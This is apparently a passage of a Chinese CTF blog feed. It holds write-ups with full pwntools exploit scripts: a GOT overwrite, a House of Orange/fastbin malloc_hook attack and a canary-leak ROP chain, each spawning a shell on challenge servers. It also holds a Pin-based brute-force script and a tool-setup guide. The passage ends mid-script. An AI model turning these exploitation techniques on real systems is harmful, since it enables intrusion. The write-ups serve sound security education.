alt></p><p>在输入数字时，能够通过溢出覆盖ptr指针和控制i的大小。IDA分析发现，<code>free_got</code>在<code>gets_got的</code>后面，把ptr覆盖成<code>gets_got</code>的地址，i修改成1，这样实际上就把<code>free_got</code>修改成了main函数地址，并且由于并且对<code>gets_got</code>进行修改，排序完输出时就leak出来<code>gets_got</code>，得到了libc基址，再把<code>atoi_got</code>修改成<code>system</code>，之后输入<code>/bin/sh</code>即可获取shell。</p><p>leak出的地址是负数，自作聪明+0x100000000强行转成了正数，结果就是一直没做出来。赛后看了dalao们的wp才发现不需要这样做orz</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *main=0x080489C9sh = process(&apos;./quicksort/quicksort&apos;)#sh = remote(&apos;34.92.96.238&apos;,10000)elf= ELF(&apos;./quicksort/quicksort&apos;)libc= ELF(&apos;./quicksort/libc.so.6&apos;)gets_got=elf.got[&apos;gets&apos;]atoi_got=elf.got[&apos;atoi&apos;]gets=libc.symbols[&apos;gets&apos;]system=libc.symbols[&apos;system&apos;]sh.recvuntil(&apos;sort?\n&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;number:&apos;)sh.sendline(str(main)+&apos;\x00&apos;*7+p32(1)*3+p32(gets_got))sh.recvuntil(&apos;result:\n&apos;)leak=int(sh.recvline())libcbase=leak-getssh.recvuntil(&apos;sort?\n&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;number:&apos;)sh.sendline(str(libcbase+system)+&apos;\x00&apos;*6+p32(2)+p32(0)*2+p32(atoi_got))sh.recvuntil(&apos;number:&apos;)sh.sendline(&apos;/bin/sh\x00&apos;)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2019-Confused</title>
      <link href="/2019/04/19/DDCTF2019-Confused/"/>
      <url>/2019/04/19/DDCTF2019-Confused/</url>
      
        <content type="html"><![CDATA[<p>题目文件为一个osx的app，打开包内容可以发现Contents/MacOS里有一个xia0Crackme，很明显是要对这个文件进行分析。</p><a id="more"></a><p>IDA打开，定位到checkcode函数，对输入进行约束，前缀为<code>DDCTF{</code>，结尾为<code>}</code>，中间部分长度为18，另外进入check函数。</p><p>经过分析，程序会根据下面的数组对输入进行校验。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">[0xf0,0x10,0x66,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x30,</span><br><span class="line">0xf6,0xc1,</span><br><span class="line">0xf0,0x10,0x63,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x31,</span><br><span class="line">0xf6,0xb6,</span><br><span class="line">0xf0,0x10,0x6a,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x32,</span><br><span class="line">0xf6,0xab,</span><br><span class="line">0xf0,0x10,0x6a,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x33,</span><br><span class="line">0xf6,0xa0,</span><br><span class="line">0xf0,0x10,0x6d,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x34,</span><br><span class="line">0xf6,0x95,</span><br><span class="line">0xf0,0x10,0x57,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x35,</span><br><span class="line">0xf6,0x8a,</span><br><span class="line">0xf0,0x10,0x6d,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x36,</span><br><span class="line">0xf6,0x7f,</span><br><span class="line">0xf0,0x10,0x73,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x37,</span><br><span class="line">0xf6,0x74,</span><br><span class="line">0xf0,0x10,0x45,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x38,</span><br><span class="line">0xf6,0x69,</span><br><span class="line">0xf0,0x10,0x6d,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x39,</span><br><span class="line">0xf6,0x5e,</span><br><span class="line">0xf0,0x10,0x72,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3a,</span><br><span class="line">0xf6,0x53,</span><br><span class="line">0xf0,0x10,0x52,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3b,</span><br><span class="line">0xf6,0x48,</span><br><span class="line">0xf0,0x10,0x66,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3c,</span><br><span class="line">0xf6,0x3d,</span><br><span class="line">0xf0,0x10,0x63,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3d,</span><br><span class="line">0xf6,0x32,</span><br><span class="line">0xf0,0x10,0x44,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3e,</span><br><span class="line">0xf6,0x27,</span><br><span class="line">0xf0,0x10,0x6a,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x3f,</span><br><span class="line">0xf6,0x1c,</span><br><span class="line">0xf0,0x10,0x79,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x40,</span><br><span class="line">0xf6,0x11,</span><br><span class="line">0xf0,0x10,0x65,0x0,0x0,0x0,</span><br><span class="line">0xf8,</span><br><span class="line">0xf2,0x41,</span><br><span class="line">0xf6,0x6,</span><br><span class="line">0xf7,0x1,0x0,0x0,0x0,</span><br><span class="line">0xf3,]</span><br></pre></td></tr></table></figure><p><code>0xf0</code>使<code>a=0xf0后面的第二个数</code></p><p><code>0xf8</code>使<code>a</code>凯撒移位2位</p><p><code>0xf2</code>比较输入与<code>a</code>是否相等</p><p><code>0xf6</code>如果相等则向下运行，否则改变程序流程</p><p><code>0xf7</code>使标记<code>success</code>和<code>failed</code>的标志位为<code>success</code></p><p><code>0xf3</code>结束程序</p><p>加密解密不是很复杂，贴上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s=[0x66,0x63,0x6a,0x6a,0x6d,0x57,0x6d,0x73,0x45,0x6d,0x72,0x52,0x66,0x63,0x44,0x6a,0x79,0x65]</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in s:</span><br><span class="line">    if i&gt;=ord(&apos;a&apos;) and i&lt;=ord(&apos;z&apos;):</span><br><span class="line">        flag+=chr((i-ord(&apos;a&apos;)+2)%26+ord(&apos;a&apos;))</span><br><span class="line">    elif i&gt;=ord(&apos;A&apos;) and i&lt;=ord(&apos;Z&apos;):</span><br><span class="line">        flag+=chr((i-ord(&apos;A&apos;)+2)%26+ord(&apos;A&apos;))</span><br><span class="line">    else:</span><br><span class="line">        flag+=chr(i)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-homura_note</title>
      <link href="/2019/04/17/CGCTF-homura-note/"/>
      <url>/2019/04/17/CGCTF-homura-note/</url>
      
        <content type="html"><![CDATA[<p>House of Orange &amp; Fastbin Attack</p><a id="more"></a><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>程序初始化了2个大小为0x88的note，内容是两个字符串。</p><p>程序有三个函数，<code>add</code>，<code>show</code>和<code>pandorabox</code>。</p><p>其中，<code>add</code>函数功能是分配一个note，大小限制为0-4096字节，但是读入内容时没有限制大小，存在堆溢出。</p><p><code>show</code>函数功能是输出一个note的内容。</p><p><code>pandorabox</code>函数只能使用一次，功能为输出初始的两个note的内容，然后free这两个note进unsortedbin，fd和bk指针指向<code>main_arena+88</code>，但是并没有把指向这两个note的指针置零，所以执行完这个函数之后使用<code>show</code>函数输出note0的内容，就可以得到<code>main_arena+88</code>的地址，也就得到了libc的所有地址。</p><h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>通过控制top chunk的size，可以使得free出的是fastbin，并且控制fastbin的size是0x71，这样在之后能够在<code>malloc_hook</code>之前构造大小为0x7f的chunk，使用Fastbin Attack写内容到<code>malloc_hook</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0xe40,&apos;d&apos;*0xe40+p64(0)+p64(0x91))add(0x90,&apos;c&apos;)</span><br></pre></td></tr></table></figure><p>经过精心的构造，这样就分配出size为0x71的fastbin。</p><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>在进行Fastbin Attack，还需要先泄漏libc地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(&quot;&gt;&gt;&quot;)sh.sendline(&apos;3&apos;)sh.recvuntil(&apos;(yes:1)&apos;)sh.sendline(&apos;1&apos;)show(0)sh.recvuntil(&apos;:&apos;)leak=u64(sh.recv(6)+&quot;\x00\x00&quot;)fakechunk=leak-88-16-0x20-3onegadget_addr=leak-88-0x3bfb00+0xf241b</span><br></pre></td></tr></table></figure><p>此时Fastbin里只有一块，并且fd指针指向0x0，设法修改fd指针，即可实现Fastbin Attack。</p><p>因为之前使用<code>pandorabox</code>时，free掉了初始化的两个note，并且合并成了一块大小为0x121。</p><p>这时申请一块大小为0x110的note，就会分配到之前初始化的note的地址，因为这个地址是在置入fastbin的note之前的，所以利用堆溢出可以修改fd指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x110,&apos;a&apos;*0xf60+p64(0)+p64(0x71)+p64(fakechunk))add(0x60,&apos;a&apos;)add(0x60,&apos;a&apos;*19+p64(onegadget_addr))sh.interactive()</span><br></pre></td></tr></table></figure><p>之后再申请一块任意大小的note，就会调用<code>malloc_hook</code>里的onegadget，获取shell。</p><h1 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *#sh=process(&apos;./note&apos;)sh=remote(&apos;45.76.173.177&apos;,5678)libc=ELF(&apos;./libc6_2.24-12ubuntu1_amd64.so&apos;)onegadget=[0x45556,0x455aa,0xf15a1,0xf241b]def add(size,content):sh.recvuntil(&apos;&gt;&gt;&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;:&apos;)sh.sendline(str(int(size)))sh.recvuntil(&apos;:&apos;)sh.sendline(content)def show(index):sh.recvuntil(&apos;&gt;&gt;&apos;)sh.sendline(&apos;2&apos;)sh.recvuntil(&apos;:&apos;)sh.sendline(str(index))add(0xe40,&apos;d&apos;*0xe40+p64(0)+p64(0x91))add(0x90,&apos;c&apos;)sh.recvuntil(&quot;&gt;&gt;&quot;)sh.sendline(&apos;3&apos;)sh.recvuntil(&apos;(yes:1)&apos;)sh.sendline(&apos;1&apos;)show(0)sh.recvuntil(&apos;:&apos;)leak=u64(sh.recv(6)+&quot;\x00\x00&quot;)fakechunk=leak-88-16-0x20-3onegadget_addr=leak-88-0x3bfb00+0xf241badd(0x110,&apos;a&apos;*0xf60+p64(0)+p64(0x71)+p64(fakechunk))add(0x60,&apos;a&apos;)add(0x60,&apos;a&apos;*19+p64(onegadget_addr))sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Ubuntu16.04配置</title>
      <link href="/2019/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Ubuntu16-04%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>记录一下，方便以后虚拟机爆炸时重新配置。</p><a id="more"></a><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><p>跳到更新源文件所在的目录下，终端执行：</p><p><code>cd /etc/apt/</code></p><p>此时，我们可以在当前目录看一下里面的文件，终端执行: ls   我们会看到当前目录下所有文件，不出意外 会有一个sources.list文件，这个文件里面写的就是更新源。我们接下来都是对它进行操作</p><p>将原来的更新源备份一下，注意要用管理员权限进行操作，终端执行：</p><p><code>sudo cp sources.list copy_sources.list</code></p><p>此时，当前目录下会多一个copy_sources.list的文件，是我们自己的备份，万一我们把更新源改坏了，还可以恢复回来</p><p>更换更新源，终端执行：</p><p><code>sudo gedit sources.list</code></p><p>然后复制想换的源进去保存就可以了</p><p>阿里源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span><br><span class="line">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</span><br></pre></td></tr></table></figure><p>更新源，终端执行：</p><p><code>sudo apt update</code></p><h1 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h1><p>终端执行：</p><p><code>sudo apt install python-pip</code></p><h1 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h1><p>新建一个<code>~/.pip/pip.conf</code></p><p>内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h1 id="更新pip"><a href="#更新pip" class="headerlink" title="更新pip"></a>更新pip</h1><p>终端执行：</p><p><code>sudo pip install --upgrade pip</code></p><p>终端执行：</p><p><code>sudo gedit /usr/bin/pip</code></p><p>将</p><p><code>from pip import main</code></p><p>改为</p><p><code>from pip._internal import main</code></p><p>保存即可</p><h1 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h1><p>终端执行：</p><p><code>sudo apt install git</code></p><h1 id="安装ruby"><a href="#安装ruby" class="headerlink" title="安装ruby"></a>安装ruby</h1><p>终端执行：</p><p><code>sudo apt install ruby</code></p><h1 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h1><p>终端执行：</p><p><code>sudo pip install pwntools</code></p><h1 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h1><p>终端执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><h1 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h1><p>终端执行：</p><p><code>sudo gem install one_gadget</code></p><h1 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h1><p>终端执行：</p><p><code>sudo pip install ropgadget</code></p><h1 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h1><p>终端执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><h1 id="安装z3"><a href="#安装z3" class="headerlink" title="安装z3"></a>安装z3</h1><p>终端执行：</p><p><code>pip install z3-solver</code></p><h1 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h1><p>终端执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenvwrapper</span><br><span class="line">export WORKON_HOME=$HOME/Python-workhome</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">mkvirtualenv angr</span><br><span class="line">pip install angr</span><br></pre></td></tr></table></figure><p>为方便以后使用，写一个<code>vr.sh</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export WORKON_HOME=$HOME/Python-workhome</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><p>使用时，终端执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. vr.sh</span><br><span class="line">workon angr</span><br></pre></td></tr></table></figure><p>进入安装好angr的虚拟环境</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PinTool安装与简单使用</title>
      <link href="/2019/04/15/PinTool%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/04/15/PinTool%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>整了好久…话说去年看东南平台上的那道mov时就想试试pin了，结果一直不知道咋整，上周六东南校赛又出了一道几乎一样的题，迫使我从零开始重新弄了一遍，最后结合很多dalao的教程终于能跑起来了。<br><a id="more"></a></p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://software.intel.com/en-us/articles/pin-a-binary-instrumentation-tool-downloads" target="_blank" rel="noopener">微软官方网址</a></p><p>选择对应的系统下载并解压即可</p><p>我这里使用的是linux版本，osx版本在之后使用时需要关闭sip保护，也不是很困难但是既然linux可以直接用就不搞那么麻烦了</p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd pin/source/tools/ManualExamples/</span><br><span class="line">make TARGET=ia32/intel64 #可以指定目标版本</span><br></pre></td></tr></table></figure><p>编译好之后当前目录就会出现obj-ia32/obj-intel64文件夹，之后根据文件是32位/64位使用对应的文件夹里的.so文件。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>这里贴上东南平台上的mov的解题脚本</p><p>只要编译好之前的ManualExamples就能运行，算是pin最简单的使用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python#-*- coding:utf-8 -*-import popen2,string INFILE = &quot;test&quot;CMD = &quot;~/pin/pin -t ~/pin/source/tools/ManualExamples/obj-ia32/inscount1.so -- ~/mov.dms &lt; &quot; + INFILEchoices = &quot;(_ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;abcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^`|~&quot;#自定义爆破字典顺序，将数字和小写字母提前可以使得速度快一些~ def execlCommand(command):    global f    fin,fout = popen2.popen2(command)    result1 = fin.readline()#获取程序自带打印信息，wrong或者correct    print result1    result2 = fin.readline()#等待子进程结束,结果输出完成    fin.close()   def writefile(data):    fi = open(INFILE,&apos;w&apos;)    fi.write(data)    fi.close() flag = &apos;&apos;while 1:    l = 0#初始化计数器    for i in choices:        key = flag + i        print &quot;&gt;&quot;,key        writefile(key)        execlCommand(CMD)        fi = open(&apos;./inscount.out&apos;, &apos;r&apos;)        while(1):            try:                n = int(fi.read().split(&apos; &apos;)[1], 10)                break            except IndexError:                continue        fi.close()        print n        if(l-n &gt; 1 and l):#如果两次运行指令差别过大，说明字符正确            flag += i            print flag            break        else:            l = n    if &apos;&#125;&apos; in flag:    breakprint flag</span><br></pre></td></tr></table></figure><p>脚本有点小问题，字典第一个字符最好放一个不可能出现在flag里的字符。</p><p><del>跑的电脑好烫</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku-pwn3</title>
      <link href="/2019/04/08/bugku-pwn3/"/>
      <url>/2019/04/08/bugku-pwn3/</url>
      
        <content type="html"><![CDATA[<p>题目保护全开，leak canary+libc。</p><a id="more"></a><p>好久没发blog了<img src="https://ws2.sinaimg.cn/large/006tNc79gy1g1vi04cullj301m01rq2r.jpg" alt></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>程序有两次输入机会，第一次可以任意输入，同时输入完还会打印出输入的内容。第二次最多只能输入624个字符，而输入624个字符正好可以把返回地址覆盖完毕。通过把返回地址覆盖成main地址，实现多次运行main函数，完成所需的leak以及最终获取shell。</p><h1 id="第一次运行main"><a href="#第一次运行main" class="headerlink" title="第一次运行main"></a>第一次运行main</h1><p>第一次输入，覆盖掉canary的<code>\x00</code>位，在之后程序就会打印出canary，第二次输入的时候就可以绕过canary保护。PIE保护会导致程序的地址随机化，但是后三位是不会变的，例如第二次输入完后程序的返回地址<code>main+e</code>的后三位就是0xd2e，利用输入把2e覆盖成20，程序就会再次运行main函数。</p><h1 id="第二次运行main"><a href="#第二次运行main" class="headerlink" title="第二次运行main"></a>第二次运行main</h1><p>第一次输入时，覆盖到返回地址前，这样程序会打印出<code>main+e</code>的地址，结合ida分析的结果可以得到程序的基址。第二次输入同第一次main函数。</p><h1 id="第三次运行main"><a href="#第三次运行main" class="headerlink" title="第三次运行main"></a>第三次运行main</h1><p>第一次输入时，布置好栈，使程序运行puts，打印出puts的got表地址，同时打印完返回到main函数。第二次输入同第一次输入，但是只需要624个字符。</p><h1 id="第四次运行main"><a href="#第四次运行main" class="headerlink" title="第四次运行main"></a>第四次运行main</h1><p>第一次输入时，布置好栈，使程序运行puts，打印出read的got表地址，同时打印完返回到main函数。第二次输入同第一次输入，但是只需要624个字符。</p><p>获取了read和puts的地址后就可以知道libc的版本以及基址。</p><h1 id="第五次运行main"><a href="#第五次运行main" class="headerlink" title="第五次运行main"></a>第五次运行main</h1><p>第一次输入忽略，第二次输入把返回地址修改成onegadget地址。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">puts_plt=0x8b0</span><br><span class="line">puts_got=0x202018</span><br><span class="line">read_got=0x202048</span><br><span class="line">pop_rdi=0xe03</span><br><span class="line">sh=remote(&apos;114.116.54.89&apos;,10000)</span><br><span class="line">sh.recvuntil(&quot;path:\n&quot;)</span><br><span class="line">sh.sendline(&quot;flag&quot;)</span><br><span class="line">sh.recvuntil(&quot;len:\n&quot;)</span><br><span class="line">sh.sendline(&quot;624&quot;)</span><br><span class="line">sh.recvuntil(&quot;note:\n&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*600)</span><br><span class="line">sh.recvuntil(&apos;aaaaaaaaa\n&apos;)</span><br><span class="line">canary=u64(&quot;\x00&quot;+sh.recv(7))</span><br><span class="line">sh.recvuntil(&quot;)\n&quot;)</span><br><span class="line">sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+&apos;\x20&apos;)</span><br><span class="line">sh.recvuntil(&quot;path:\n&quot;)</span><br><span class="line">sh.sendline(&quot;flag&quot;)</span><br><span class="line">sh.recvuntil(&quot;len:\n&quot;)</span><br><span class="line">sh.sendline(&quot;624&quot;)</span><br><span class="line">sh.recvuntil(&quot;note:\n&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*615)</span><br><span class="line">sh.recvuntil(&apos;aaaaaaaaa\n&apos;)</span><br><span class="line">main=u64(sh.recv(6)+&quot;\x00\x00&quot;)-0xe</span><br><span class="line">base=main-0xd20</span><br><span class="line">sh.recvuntil(&quot;)\n&quot;)</span><br><span 